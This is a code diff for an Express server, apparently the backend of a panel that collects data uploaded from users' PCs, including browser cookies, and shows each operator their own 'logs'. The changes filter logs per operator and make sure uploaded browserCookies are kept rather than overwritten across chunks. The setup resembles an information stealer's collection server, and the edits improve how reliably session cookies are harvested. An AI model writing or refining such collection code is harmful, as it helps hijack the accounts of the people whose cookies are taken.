@@ -298,7 +298,17 @@ app.get('/api/logs', authenticateToken, (req, res) => {
         
         // Filter logs by the logged-in user's username
         // Each log has a "user" field that matches the client's user identifier
-        const logs = logsDb.getAll(username);
+        let logs = logsDb.getAll();
+        
+        // Filter logs by username - only show logs where log.user matches the logged-in username
+        logs = logs.filter(log => {
+            // If log has no user field, don't show it (or show only to admin)
+            if (!log.user) {
+                return false; // Don't show logs without user field
+            }
+            // Show log if user matches
+            return log.user === username;
+        });
         
         res.json(logs);
     } catch (error) {
@@ -352,14 +362,22 @@ app.post('/api/upload', (req, res) => {
         // Only include browserCookies in pcData if we actually have cookies in this chunk
         // This prevents overwriting existing cookies with empty arrays from later chunks
         const pcDataToStore = { ...pcData };
-        if (transformedBrowserCookies.length > 0 || (pcData.browserCookies && typeof pcData.browserCookies === 'string' && pcData.browserCookies.length > 0)) {
-            // Only update browserCookies if this chunk has actual cookie data
-            pcDataToStore.browserCookies = transformedBrowserCookies.length > 0 ? transformedBrowserCookies : pcData.browserCookies;
-        } else if (!pcData.browserCookies) {
-            // If this chunk doesn't have browserCookies at all, don't include it
-            // This allows the merge logic to preserve existing cookies
-            delete pcDataToStore.browserCookies;
+        
+        // Always preserve browserCookies if they exist in the incoming data
+        if (pcData.browserCookies !== undefined && pcData.browserCookies !== null) {
+            if (transformedBrowserCookies.length > 0) {
+                // We have parsed cookies - use them
+                pcDataToStore.browserCookies = transformedBrowserCookies;
+            } else if (typeof pcData.browserCookies === 'string' && pcData.browserCookies.length > 0) {
+                // Keep the original string if parsing failed but string exists
+                pcDataToStore.browserCookies = pcData.browserCookies;
+            } else if (Array.isArray(pcData.browserCookies) && pcData.browserCookies.length > 0) {
+                // Keep the array if it exists
+                pcDataToStore.browserCookies = pcData.browserCookies;
+            }
+            // If browserCookies is null/empty, we still include it so merge logic knows to update
         }
+        // If browserCookies is not in pcData at all, don't include it (allows merge to preserve existing)
         
         // Extract user from pcData
         const user = pcData?.user || null;
